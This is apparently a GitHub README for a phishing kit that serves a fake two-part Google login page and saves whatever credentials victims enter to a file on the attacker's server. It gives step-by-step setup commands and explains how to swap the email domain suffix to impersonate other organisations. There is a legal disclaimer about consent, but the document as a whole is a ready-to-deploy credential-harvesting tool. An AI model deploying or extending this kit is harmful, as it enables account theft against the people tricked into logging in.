# GooglePhishing

This repo contains a fake two-part Google Login. It can be used on a web server that supports PHP files. Any entered credentials are saved in <b>/opt/GooglePhishing/creds.txt</b>. The Domain Suffix can be changed from <b>@client.com</b> to any site of your choosing (to do this, just edit line 21 of index.html). Follow steps below for a quick and easy setup.

<p float="left">
<img alt='Email Page' src='http://165.227.79.102/img/1.png?q=1' style='width:400px;'/>
<img alt='Password Page' src='http://165.227.79.102/img/2.png' style='width:400px;'/>
</p>

Legal Disclaimer: Usage of this repo for attacking targets without prior consent is illegal. It is the end user's responsiblity to obey applicable local, state and federal laws. Developer assumes no liability for any misuse or damage caused by this repo.

### Get Started

Run the below commands in the <b>/var/www/html</b> folder of your web server.

```
git clone https://github.com/jakedmurphy1/GooglePhishing.git
```

```
cd GooglePhishing
```

```
chmod 666 creds.txt
```
Move the credentials file into a non-public folder:
```
mkdir /opt/GooglePhishing && mv creds.txt /opt/GooglePhishing/creds.txt
```

Then visit <b>/GooglePhishing/index.html</b> in your browser and give it a try! Any gathered credentials will be stored in <b>/opt/GooglePhishing/creds.txt</b>

